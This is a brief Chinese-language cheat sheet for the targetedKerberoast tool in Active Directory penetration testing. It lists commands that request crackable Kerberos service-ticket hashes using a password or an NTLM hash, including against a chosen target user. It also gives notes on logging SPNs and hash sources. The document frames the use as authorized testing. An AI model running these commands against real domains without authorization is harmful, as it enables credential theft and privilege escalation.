# targetedKerberoast 常用用法

targetedKerberoast 适合授权 AD 环境里的 Kerberoast 辅助验证。常用参数：域、用户、密码、DC IP。

```bash
python3 targetedKerberoast.py -d example.local -u USER -p 'PASSWORD' --dc-ip 192.168.1.10
```

```bash
python3 targetedKerberoast.py -d example.local -u USER -H NTLM_HASH --dc-ip 192.168.1.10
```

```bash
python3 targetedKerberoast.py -d example.local -u USER -p 'PASSWORD' --request-user TARGET --dc-ip 192.168.1.10
```

```bash
python3 targetedKerberoast.py -h
```

Kerberoast 相关结果要记录 SPN、账号、加密类型和 hash 来源。后续破解和权限验证要分开保存。
